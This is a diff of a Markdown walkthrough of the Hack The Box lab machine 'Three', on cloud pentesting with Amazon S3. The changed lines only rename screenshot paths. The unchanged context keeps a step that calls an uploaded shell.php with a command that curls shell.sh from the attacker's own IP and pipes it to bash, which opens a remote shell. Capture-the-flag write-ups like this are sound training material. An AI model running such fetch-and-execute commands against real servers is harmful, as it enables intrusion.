@@ -7,7 +7,7 @@
 * _in this Box will new some steps in *cloud pentesting* and will know about *Amazon S3* and how we can know about its contents and how make our machine contact easily with it._ 
 
 # _**NMAP**_
-![](/Assets/HTB/THREE/assets/nmap.png)
+![](/Assets/HTB/THREE/assets/namp.png)
 
 # _**Ports**_ 
 _we find port 22 for ssh connection and port 80 for http service will discover it , let's check it by browser ._ 
@@ -105,9 +105,9 @@ _by this command will start http server **python3 -m http.server 8000**_
 
 _we will use **curl** to fetch the bash file and do that in browser by this **http://thetoppers.htb/shell.php?cmd=curl%20<YOUR_IP_ADDRESS>:8000/shell.sh|bash**_ 
 
-![](/Assets/HTB/THREE/assets/remote.png)
+![](/Assets/HTB/THREE/assets/remote1.png)
 
-![](/Assets/HTB/THREE/assets/flag.png)
+![](/Assets/HTB/THREE/assets/flag1.png)
 
 
 
